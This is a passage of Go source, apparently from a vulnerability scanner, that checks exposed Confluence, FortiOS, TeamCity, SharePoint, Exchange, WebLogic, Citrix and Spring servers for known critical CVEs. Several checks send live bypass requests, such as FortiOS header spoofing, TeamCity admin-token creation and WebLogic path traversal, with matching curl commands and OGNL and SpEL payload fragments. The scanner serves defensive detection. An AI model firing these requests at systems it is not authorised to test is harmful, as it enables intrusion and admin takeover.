// Surface probe: fingerprint Confluence via /login.action (body must contain "Confluence"
// or the X-Confluence-Request-Time header). Emitting a finding notes the exposure.
// The actual exploitation (OGNL in URI path) is Deep mode only.
func probeConfluenceOGNL(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/login.action"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	// Must be 200 (not redirected already — older Confluence serves login.action directly).
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := strings.ToLower(string(b))
	isConfluence := strings.Contains(bStr, "confluence") ||
		resp.Header.Get("X-Confluence-Request-Time") != ""
	if !isConfluence {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEConfluenceOGNL,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2022-26134: Atlassian Confluence exposed — OGNL injection risk on %s", asset),
		Description: "Atlassian Confluence is internet-accessible. CVE-2022-26134 (CVSS 9.8, KEV) allows " +
			"unauthenticated OGNL expression injection via any Confluence action URL path segment " +
			"(e.g. /${Class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(...)}/login.action). " +
			"This was a zero-day exploited before patch availability and remains widely targeted. " +
			"Verify the version is patched: Confluence ≥ 7.4.17 (LTS), ≥ 7.13.7, ≥ 7.14.3, ≥ 7.15.2, ≥ 7.16.4, ≥ 7.17.4, or ≥ 7.18.1.",
		Asset: asset,
		Evidence: map[string]any{
			"url": u,
		},
		ProofCommand: fmt.Sprintf("curl -sI '%s' | grep -i 'x-confluence'", u),
		DiscoveredAt: time.Now(),
	}
}

// probeFortiOSAuthBypass tests for CVE-2022-40684 (FortiOS/FortiProxy authentication bypass,
// CVSS 9.8, KEV). The bypass works by crafting an HTTP request with a Forwarded header pointing
// to 127.0.0.1, which the FortiOS REST API treats as a trusted local request, bypassing authentication.
// Surface probe: fingerprint FortiOS first, then try the bypass on a read-only endpoint.
func probeFortiOSAuthBypass(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Fingerprint: FortiOS management interface shows a distinctive login page.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/login", nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	fb, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	fbStr := strings.ToLower(string(fb))
	isFortiOS := strings.Contains(fbStr, "fortinet") || strings.Contains(fbStr, "fortigate") ||
		strings.Contains(fbStr, "fortiproxy") || strings.Contains(fbStr, "fortios")
	if !isFortiOS {
		return nil
	}

	// Bypass: GET /api/v2/cmdb/system/admin with Forwarded: for=127.0.0.1.
	// On vulnerable versions, this returns 200 JSON with admin account list.
	u := base + "/api/v2/cmdb/system/admin"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("Forwarded", "for=127.0.0.1")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	if !strings.Contains(bStr, `"results"`) && !strings.Contains(bStr, `"name"`) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEFortiOSAuthBypass,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2022-40684: FortiOS/FortiProxy auth bypass confirmed on %s", asset),
		Description: "The FortiOS REST API /api/v2/cmdb/system/admin returned data without valid credentials. " +
			"CVE-2022-40684 (CVSS 9.8, KEV) exploits a Forwarded header trust flaw: requests with " +
			"'Forwarded: for=127.0.0.1' bypass authentication on FortiOS 7.0.0–7.0.6, 7.2.0–7.2.1 " +
			"and FortiProxy 7.0.0–7.0.6, 7.2.0. This was exploited as a zero-day before patch availability. " +
			"Upgrade to FortiOS ≥ 7.0.7 / ≥ 7.2.2 and restrict management interface access immediately.",
		Asset: asset,
		Evidence: map[string]any{
			"url":  u,
			"body": bStr[:min(len(bStr), 512)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -H 'Forwarded: for=127.0.0.1' '%s'\n"+
				"# Expected on vulnerable: JSON admin account list without credentials",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeTeamCityRPC2 tests for CVE-2023-42793 (TeamCity /RPC2 wildcard bypass, CVSS 9.8, KEV).
// POST /app/rest/users/id:1/tokens/RPC2 creates an admin API token without authentication
// on TeamCity < 2023.05.4 by exploiting the /**/RPC2 path allowlist in RequestInterceptors.
// This is distinct from CVE-2024-27198 (;.ico path confusion). Deep mode only — creating a
// token is a state modification even if the token is not used.
func probeTeamCityRPC2(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Fingerprint TeamCity first.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/login.html", nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	fb, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	if !strings.Contains(strings.ToLower(string(fb)), "teamcity") {
		return nil
	}

	u := base + "/app/rest/users/id:1/tokens/RPC2"
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, u, strings.NewReader("{}"))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	// Response contains a JSON token with a "value" field.
	if !strings.Contains(bStr, `"value"`) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVETeamCityRPC2,
		Module:   "deep",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-42793: TeamCity admin token created without auth on %s", asset),
		Description: "TeamCity responded to a POST /app/rest/users/id:1/tokens/RPC2 with an admin API token " +
			"without any authentication. CVE-2023-42793 (CVSS 9.8, KEV) exploits the /**/RPC2 path wildcard " +
			"in TeamCity's RequestInterceptors authorization allowlist. Paths ending in /RPC2 bypass all " +
			"authentication checks. APT29 (SVR/CozyBear), Diamond Sleet, and Onyx Sleet (DPRK) all exploited " +
			"this to compromise CI/CD pipelines. This is distinct from CVE-2024-27198 (;.ico bypass). " +
			"Upgrade TeamCity to ≥ 2023.05.4 immediately.",
		Asset: asset,
		Evidence: map[string]any{
			"url":  u,
			"body": bStr[:min(len(bStr), 256)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -X POST -H 'Content-Type: application/json' -d '{}' '%s'\n"+
				"# Expected on vulnerable: JSON with admin API token value",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeSharePointJWT checks for CVE-2023-29357 (SharePoint Server 2019 JWT none-alg
// auth bypass, CVSS 9.8, KEV). SharePoint returns the MicrosoftSharePointTeamServices
// header even on unauthenticated requests — this leaks the exact build version.
// Versions before the June 2023 CU (build < 16.0.10399) are vulnerable to the JWT
// signature bypass that allows impersonation of any user including site admins.
func probeSharePointJWT(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// /_api/contextinfo returns the SharePoint version header even on 401/403.
	// /_vti_inf.html is always publicly accessible and also fingerprints SharePoint.
	for _, path := range []string{"/_api/contextinfo", "/_vti_inf.html"} {
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+path, nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		// Check for SharePoint version in the response header.
		spVer := resp.Header.Get("MicrosoftSharePointTeamServices")
		if spVer == "" {
			// Also check body for SharePoint markers (/_vti_inf.html path).
			bLower := strings.ToLower(string(b))
			if !strings.Contains(bLower, "sharepoint") && !strings.Contains(bLower, "microsoft-sharepoint") {
				continue
			}
			// Fingerprinted as SharePoint but no version header — emit advisory finding.
			return &finding.Finding{
				CheckID:  finding.CheckCVESharePointJWT,
				Module:   "surface",
				Scanner:  scannerName,
				Severity: finding.SeverityHigh,
				Asset:    asset,
				Title:    fmt.Sprintf("CVE-2023-29357: Microsoft SharePoint Server internet-exposed on %s", asset),
				Description: "A Microsoft SharePoint Server instance is internet-accessible. " +
					"CVE-2023-29357 (CVSS 9.8, KEV) allows unauthenticated privilege escalation via JWT " +
					"tokens with algorithm set to 'none' — SharePoint accepts unsigned JWTs as valid, " +
					"enabling impersonation of any user including site collection administrators. " +
					"Chained with CVE-2023-24955 (SSTI) this yields unauthenticated RCE. " +
					"Apply the June 2023 Cumulative Update or later and restrict SharePoint to internal networks.",
				Evidence: map[string]any{"url": base + path},
				ProofCommand: fmt.Sprintf(
					"curl -sI '%s/_api/contextinfo' | grep -i MicrosoftSharePointTeamServices",
					base),
				DiscoveredAt: time.Now(),
			}
		}
		// Parse SharePoint build version: "16.0.10399.20012" format.
		// June 2023 CU threshold: 16.0.10399.20000 (SharePoint Server 2019).
		vuln := isSharePointJWTVulnerable(spVer)
		if !vuln {
			return nil
		}
		return &finding.Finding{
			CheckID:  finding.CheckCVESharePointJWT,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Asset:    asset,
			Title:    fmt.Sprintf("CVE-2023-29357: SharePoint %s vulnerable to JWT none-alg bypass on %s", spVer, asset),
			Description: fmt.Sprintf(
				"Microsoft SharePoint Server %s is internet-accessible and vulnerable to CVE-2023-29357 "+
					"(CVSS 9.8, KEV). SharePoint accepts JWT tokens with algorithm 'none' as valid, "+
					"allowing unauthenticated impersonation of any user including site admins. "+
					"Chained with CVE-2023-24955 (authenticated SSTI in Business Data Connectivity) "+
					"this gives unauthenticated RCE. Apply the June 2023 Cumulative Update (build ≥ 16.0.10399).",
				spVer,
			),
			Evidence: map[string]any{
				"sharepoint_version": spVer,
				"url":                base + path,
			},
			ProofCommand: fmt.Sprintf(
				"curl -sI '%s/_api/contextinfo' | grep -i MicrosoftSharePointTeamServices\n"+
					"# Expected: MicrosoftSharePointTeamServices: %s — confirms unpatched SharePoint build",
				base, spVer),
			DiscoveredAt: time.Now(),
		}
	}
	return nil
}

// isSharePointJWTVulnerable returns true if the SharePoint build version is below
// the June 2023 Cumulative Update threshold (16.0.10399.x for SharePoint 2019).
func isSharePointJWTVulnerable(ver string) bool {
	// Format: "16.0.10399.20012"
	parts := strings.Split(ver, ".")
	if len(parts) < 3 {
		return false
	}
	if parts[0] != "16" || parts[1] != "0" {
		return false
	}
	build := 0
	fmt.Sscanf(parts[2], "%d", &build)
	// June 2023 CU for SharePoint Server 2019: build 16.0.10399.20000
	// SharePoint Subscription Edition June 2023 CU: build 16.0.15601.20188
	// For the 2019 release train (builds in the 10xxx range): < 10399 is unpatched.
	return build < 10399
}

// probeExchangeOWAVersion reads the X-OWA-Version header from /owa/ to detect
// Microsoft Exchange versions vulnerable to ProxyLogon (CVE-2021-26855, CVSS 9.8, KEV)
// and/or ProxyShell (CVE-2021-34473/34523/31207, CVSS 9.8, KEV).
// Both vulnerabilities allow pre-authentication code execution on Exchange.
func probeExchangeOWAVersion(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/owa/"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	ver := resp.Header.Get("X-OWA-Version")
	if ver == "" {
		return nil
	}
	proxyLogon, proxyShell := exchangeVulnStatus(ver)
	if !proxyLogon && !proxyShell {
		return nil
	}
	if proxyLogon {
		return &finding.Finding{
			CheckID:  finding.CheckCVEExchangeProxyLogon,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Asset:    asset,
			Title:    fmt.Sprintf("CVE-2021-26855: Exchange %s vulnerable to ProxyLogon on %s", ver, asset),
			Description: fmt.Sprintf(
				"Microsoft Exchange %s is internet-accessible and vulnerable to CVE-2021-26855 "+
					"(ProxyLogon, CVSS 9.8, KEV). ProxyLogon is a pre-authentication SSRF that chains with "+
					"CVE-2021-27065 (post-auth file write) for unauthenticated RCE. HAFNIUM and numerous "+
					"ransomware groups mass-exploited this within days of disclosure. This version is also "+
					"vulnerable to CVE-2021-34473/34523/31207 (ProxyShell). "+
					"Patch to the March 2021 or later Cumulative Update immediately.",
				ver,
			),
			Evidence: map[string]any{
				"x_owa_version": ver,
				"owa_url":       u,
			},
			ProofCommand: fmt.Sprintf(
				"curl -sI '%s' | grep -i 'x-owa-version'\n"+
					"# Expected: X-OWA-Version: %s — confirms vulnerable Exchange OWA exposed",
				u, ver),
			DiscoveredAt: time.Now(),
		}
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEExchangeProxyShell,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2021-34473: Exchange %s vulnerable to ProxyShell on %s", ver, asset),
		Description: fmt.Sprintf(
			"Microsoft Exchange %s is internet-accessible and vulnerable to CVE-2021-34473/34523/31207 "+
				"(ProxyShell, CVSS 9.8, KEV). ProxyShell chains three vulnerabilities to allow "+
				"pre-authentication remote code execution via the Autodiscover service. "+
				"Widely exploited by ransomware groups (LockFile, Conti, Hive, CUBA) in mid-2021. "+
				"Patch to the July 2021 or later Cumulative Update immediately.",
			ver,
		),
		Evidence: map[string]any{
			"x_owa_version": ver,
			"owa_url":       u,
		},
		ProofCommand: fmt.Sprintf(
			"curl -sI '%s' | grep -i 'x-owa-version'\n"+
				"# Expected: X-OWA-Version: %s — confirms vulnerable Exchange OWA exposed",
			u, ver),
		DiscoveredAt: time.Now(),
	}
}

// exchangeVulnStatus checks an Exchange X-OWA-Version string (e.g., "15.2.986.26")
// and returns whether it is vulnerable to ProxyLogon (patched March 2021)
// and/or ProxyShell (patched July 2021).
func exchangeVulnStatus(ver string) (proxyLogon, proxyShell bool) {
	parts := strings.Split(ver, ".")
	if len(parts) < 3 || parts[0] != "15" {
		return false, false
	}
	var minor, build, rev int
	fmt.Sscanf(parts[1], "%d", &minor)
	fmt.Sscanf(parts[2], "%d", &build)
	if len(parts) >= 4 {
		fmt.Sscanf(parts[3], "%d", &rev)
	}
	switch minor {
	case 0: // Exchange 2013
		// ProxyLogon patch: 15.0.1497.15 | ProxyShell patch: 15.0.1497.23
		if build < 1497 || (build == 1497 && rev < 15) {
			return true, true
		}
		return false, build == 1497 && rev < 23
	case 1: // Exchange 2016
		// ProxyLogon patch: 15.1.2176.9 | ProxyShell patch: 15.1.2308.14
		if build < 2176 || (build == 2176 && rev < 9) {
			return true, true
		}
		return false, build < 2308 || (build == 2308 && rev < 14)
	case 2: // Exchange 2019
		// ProxyLogon patch: 15.2.792.15 | ProxyShell patch: 15.2.986.14
		if build < 792 || (build == 792 && rev < 15) {
			return true, true
		}
		return false, build < 986 || (build == 986 && rev < 14)
	}
	return false, false
}

// probeApacheHTTPVersion checks the Server header for Apache httpd 2.4.49 or 2.4.50,
// the only two versions vulnerable to CVE-2021-41773/42013 (path traversal / RCE, CVSS 9.8, KEV).
// The broken path normalization in these versions allows ../ traversal via URL-encoded sequences;
// if mod_cgi is enabled this becomes unauthenticated RCE.
func probeApacheHTTPVersion(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/", nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	server := resp.Header.Get("Server")
	if server == "" {
		return nil
	}
	var ver, cve string
	switch {
	case strings.Contains(server, "Apache/2.4.49"):
		ver, cve = "2.4.49", "CVE-2021-41773"
	case strings.Contains(server, "Apache/2.4.50"):
		// 2.4.50 was the incomplete fix; CVE-2021-42013 is the bypass of that fix.
		ver, cve = "2.4.50", "CVE-2021-42013"
	default:
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEApacheHTTPTraversal,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("%s: Apache httpd %s path traversal/RCE on %s", cve, ver, asset),
		Description: fmt.Sprintf(
			"Apache httpd %s is internet-accessible and vulnerable to %s (CVSS 9.8, KEV). "+
				"This version has broken path normalization that allows %%2e%%2e%%2f sequences to "+
				"escape the document root. If mod_cgi is enabled this is unauthenticated RCE. "+
				"Apache 2.4.50 was an incomplete fix; CVE-2021-42013 demonstrates the bypass via "+
				"%%2e%%2e%%2f%%2e%%2e%%2f. Both versions were mass-exploited within hours of disclosure. "+
				"Upgrade to Apache httpd 2.4.51 or later immediately.",
			ver, cve,
		),
		Evidence: map[string]any{
			"server_header": server,
			"url":           base + "/",
		},
		ProofCommand: fmt.Sprintf(
			"curl -sI '%s/' | grep -i '^Server'\n"+
				"# Expected: Server: Apache/%s — confirms vulnerable Apache httpd version",
			base, ver),
		DiscoveredAt: time.Now(),
	}
}

// probeWebLogicConsole tests for CVE-2020-14882/14883 (Oracle WebLogic admin console
// auth bypass / RCE, CVSS 9.8, KEV). It fingerprints WebLogic via /console/login/LoginForm.jsp,
// then attempts the double URL-encoded path traversal to confirm unauthenticated console access.
func probeWebLogicConsole(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	loginURL := base + "/console/login/LoginForm.jsp"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, loginURL, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	fb, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	if !strings.Contains(strings.ToLower(string(fb)), "weblogic") {
		return nil
	}
	// Probe the CVE-2020-14882 auth bypass: double URL-encoded path traversal.
	bypassURL := base + "/console/css/%252E%252E%252Fconsole.portal"
	breq, err := http.NewRequestWithContext(ctx, http.MethodGet, bypassURL, nil)
	if err == nil {
		bresp, err := client.Do(breq)
		if err == nil {
			bb, _ := io.ReadAll(io.LimitReader(bresp.Body, 8192))
			bresp.Body.Close()
			bLower := strings.ToLower(string(bb))
			if bresp.StatusCode == http.StatusOK && (strings.Contains(bLower, "welcome") ||
				strings.Contains(bLower, "dashboard") || strings.Contains(bLower, "weblogic")) {
				return &finding.Finding{
					CheckID:  finding.CheckCVEWebLogicConsole,
					Module:   "surface",
					Scanner:  scannerName,
					Severity: finding.SeverityCritical,
					Asset:    asset,
					Title:    fmt.Sprintf("CVE-2020-14882: WebLogic admin console auth bypass confirmed on %s", asset),
					Description: "The Oracle WebLogic admin console returned an unauthenticated dashboard via " +
						"the double URL-encoded path traversal (/console/css/%252E%252E%252Fconsole.portal). " +
						"CVE-2020-14882 (CVSS 9.8, KEV) allows any unauthenticated attacker to reach the admin UI. " +
						"Chained with CVE-2020-14883 (DeployerHandlerServlet RCE) this gives full OS-level code execution. " +
						"Patch to the October 2020 CPU or later and restrict the admin console to management networks.",
					Evidence: map[string]any{
						"bypass_url":  bypassURL,
						"console_url": loginURL,
					},
					ProofCommand: fmt.Sprintf(
						"curl -sI '%s'\n"+
							"# Expected: HTTP 200 with admin dashboard content — confirms unauthenticated console bypass",
						bypassURL),
					DiscoveredAt: time.Now(),
				}
			}
		}
	}
	// Console is accessible but bypass may be patched — still critical exposure.
	return &finding.Finding{
		CheckID:  finding.CheckCVEWebLogicConsole,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2020-14882: Oracle WebLogic admin console internet-exposed on %s", asset),
		Description: "The Oracle WebLogic admin console at /console/login/LoginForm.jsp is internet-accessible. " +
			"CVE-2020-14882/14883 (CVSS 9.8, KEV) allow unauthenticated access and RCE on unpatched instances. " +
			"The WebLogic admin console must never be internet-facing regardless of patch level. " +
			"Restrict access to management networks and patch to the October 2020 CPU or later.",
		Evidence: map[string]any{
			"console_url": loginURL,
		},
		ProofCommand: fmt.Sprintf(
			"curl -sI '%s'\n"+
				"# Expected: HTTP 200 — confirms WebLogic admin console is internet-accessible",
			loginURL),
		DiscoveredAt: time.Now(),
	}
}

// probeCitrixADCNitro tests for unauthenticated access to the Citrix ADC (NetScaler) Nitro API.
// CVE-2019-19781 (CVSS 9.8, KEV) allows path traversal and unauthenticated RCE on Citrix ADC/Gateway.
// CVE-2020-8196 covers unauthenticated information disclosure via the Nitro API.
// CVE-2023-3519 (CVSS 9.8, KEV): stack buffer overflow → unauthenticated RCE; version parsed from same response.
// A JSON response from /nitro/v1/config/nsversion without credentials confirms exposure.
func probeCitrixADCNitro(ctx context.Context, client *http.Client, base, asset string) []finding.Finding {
	u := base + "/nitro/v1/config/nsversion"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bStr := strings.ToLower(string(b))
	if !strings.Contains(bStr, "ns_build") && !strings.Contains(bStr, "ns_platform") &&
		!strings.Contains(bStr, "nsversion") {
		return nil
	}
	snippet := string(b)
	if len(snippet) > 256 {
		snippet = snippet[:256]
	}
	var findings []finding.Finding
	findings = append(findings, finding.Finding{
		CheckID:  finding.CheckCVECitrixADCInfo,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2019-19781: Citrix ADC Nitro API accessible unauthenticated on %s", asset),
		Description: "The Citrix ADC (NetScaler) Nitro REST API at /nitro/v1/config/nsversion responded " +
			"without authentication. CVE-2019-19781 (CVSS 9.8, KEV) allows path traversal and unauthenticated " +
			"RCE on Citrix ADC, Gateway, and SD-WAN WANOP. CVE-2020-8196 covers unauthenticated information " +
			"disclosure via this same API. An unauthenticated Nitro API exposes ADC version and configuration data. " +
			"Restrict Nitro API access to management networks and apply all available patches.",
		Evidence: map[string]any{
			"nitro_url": u,
			"response":  snippet,
		},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s'\n"+
				"# Expected: JSON with ns_platform/ns_build — confirms unauthenticated Nitro API access",
			u),
		DiscoveredAt: time.Now(),
	})
	// CVE-2023-3519: check if version is in a vulnerable range.
	// The nsversion field looks like "NetScaler NS13.1: Build 48.47.nc..." — parse maj.min and build.
	if isCitrixADCRCE2023Vulnerable(string(b)) {
		findings = append(findings, finding.Finding{
			CheckID:  finding.CheckCVECitrixADCRCE2023,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Asset:    asset,
			Title:    fmt.Sprintf("CVE-2023-3519: Citrix ADC/Gateway vulnerable to unauthenticated RCE on %s", asset),
			Description: "CVE-2023-3519 (CVSS 9.8, KEV) is a stack buffer overflow in Citrix ADC and Gateway " +
				"that allows unauthenticated remote code execution when the appliance is configured as a Gateway " +
				"(SSL VPN, ICA Proxy, CVPN, RDP Proxy) or AAA virtual server. Exploited in the wild by ransomware " +
				"operators. Vulnerable versions: < 13.1-49.15, < 13.0-91.13, < 12.1-65.25 (12.1 EOL). " +
				"Patch immediately to 13.1-49.15+ or 13.0-91.13+.",
			Evidence: map[string]any{
				"nitro_url": u,
				"response":  snippet,
			},
			ProofCommand: fmt.Sprintf(
				"curl -s '%s'\n"+
					"# Check nsversion field — NS13.1 < Build 49.15, NS13.0 < Build 91.13, NS12.1 any build = vulnerable",
				u),
			DiscoveredAt: time.Now(),
		})
	}
	return findings
}

// isCitrixADCRCE2023Vulnerable parses the NetScaler version string from a Nitro API response body
// and returns true if the version falls within a range vulnerable to CVE-2023-3519.
// Version format in JSON: "NetScaler NS13.1: Build 48.47.nc..." or similar.
func isCitrixADCRCE2023Vulnerable(body string) bool {
	// Extract the nsversion value — look for pattern NSx.y: Build b1.b2
	lower := strings.ToLower(body)
	idx := strings.Index(lower, "ns")
	for idx >= 0 && idx < len(body)-4 {
		// Try to parse NSx.y: Build b1.b2
		rest := body[idx+2:] // skip "NS"
		var maj, minor, build1, build2 int
		n, err := fmt.Sscanf(rest, "%d.%d", &maj, &minor)
		if err != nil || n != 2 {
			idx = strings.Index(lower[idx+1:], "ns")
			if idx >= 0 {
				idx += idx + 1
			}
			break
		}
		// Look for "Build b1.b2" after the major.minor
		buildIdx := strings.Index(strings.ToLower(rest), "build ")
		if buildIdx < 0 {
			break
		}
		buildStr := rest[buildIdx+6:]
		n, err = fmt.Sscanf(buildStr, "%d.%d", &build1, &build2)
		if err != nil || n != 2 {
			break
		}
		switch {
		case maj == 13 && minor == 1:
			// Vulnerable if < 13.1 Build 49.15
			return build1 < 49 || (build1 == 49 && build2 < 15)
		case maj == 13 && minor == 0:
			// Vulnerable if < 13.0 Build 91.13
			return build1 < 91 || (build1 == 91 && build2 < 13)
		case maj == 12 && minor == 1:
			// 12.1 is EOL — all versions vulnerable
			return true
		case maj == 12 && minor == 0:
			// 12.0 EOL — vulnerable
			return true
		}
		break
	}
	return false
}

// probeSpringOAuthSpEL tests for CVE-2016-4977 (Spring Security OAuth2 SpEL injection, CVSS 9.8).
// The vulnerability: the OAuth2 authorization endpoint passes the redirect_uri parameter into a
// SpEL template renderer when generating error pages. An attacker can inject SpEL expressions
// (e.g. ${T(java.lang.Runtime).getRuntime().exec(...)}) as the redirect_uri value, achieving
// unauthenticated RCE when the error page is rendered.
// Safe probe: GET /oauth/authorize with no credentials triggers an error page. If the response
// body contains Spring OAuth error format (JSON with "error" key or Whitelabel error page with
// "oauth" content), the endpoint is confirmed and CVE-2016-4977 may apply.
func probeSpringOAuthSpEL(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/oauth/authorize?response_type=code&client_id=test&scope=read"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	// 404 means no OAuth endpoint — not Spring OAuth.
	if resp.StatusCode == http.StatusNotFound {
		return nil
	}
	bodyLower := strings.ToLower(string(b))
	// Spring OAuth2 error responses are JSON {"error":"...","error_description":"..."}
	// or Spring Whitelabel Error Page containing "oauth" context.
	// Require both the endpoint to be reachable AND Spring/OAuth-specific content.
	isSpringOAuth := (strings.Contains(bodyLower, `"error"`) && strings.Contains(bodyLower, "oauth")) ||
		strings.Contains(bodyLower, "whitelabel error") ||
		strings.Contains(bodyLower, "x-application-context") ||
		strings.Contains(bodyLower, "spring security oauth")
	if !isSpringOAuth {
		// Also check for the X-Application-Context header (Spring Boot specific).
		if resp.Header.Get("X-Application-Context") == "" {
			return nil
		}
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVESpringOAuthSpEL,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2016-4977: Spring Security OAuth2 authorization endpoint exposed on %s", asset),
		Description: "The Spring Security OAuth2 /oauth/authorize endpoint is internet-accessible and returned " +
			"a Spring-specific error response. CVE-2016-4977 (CVSS 9.8) allows unauthenticated remote code execution " +
			"via SpEL (Spring Expression Language) injection in the redirect_uri parameter — when the OAuth2 server " +
			"generates an error page, it evaluates the redirect_uri value as a SpEL expression. " +
			"Affects Spring Security OAuth 2.0.x < 2.0.10, 2.1.x < 2.1.5. " +
			"Upgrade Spring Security OAuth and restrict the /oauth/ endpoints from public access.",
		Evidence: map[string]any{
			"endpoint":    u,
			"status_code": resp.StatusCode,
		},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s'\n"+
				"# Expected: Spring OAuth JSON error or Whitelabel error page — confirms endpoint is exposed",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeSpring4Shell tests for CVE-2022-22965 (Spring4Shell, CVSS 9.8, KEV).
// Spring MVC on JDK 9+ binds HTTP parameters to model attributes by default; the class
// attribute chain class.module.classLoader.URLs exposes the ClassLoader, allowing an
// attacker to overwrite the logging configuration and drop a JSP webshell.
// The safe probe sends class.module.classLoader.URLs[0]=0 and looks for a Spring-specific
// 400 "data binding" error — a generic 400 from unrelated servers is disambiguated by body.
func probeSpring4Shell(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/?class.module.classLoader.URLs[0]=0"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		return nil
	}
	bodyLower := strings.ToLower(string(b))
	// Spring returns a Whitelabel Error Page or JSON error mentioning "classLoader" or "data binding"
	if !strings.Contains(bodyLower, "classloader") &&
		!strings.Contains(bodyLower, "data binding") &&
		!strings.Contains(bodyLower, "spring") &&
		!strings.Contains(bodyLower, "whitelabel") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVESpring4Shell,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
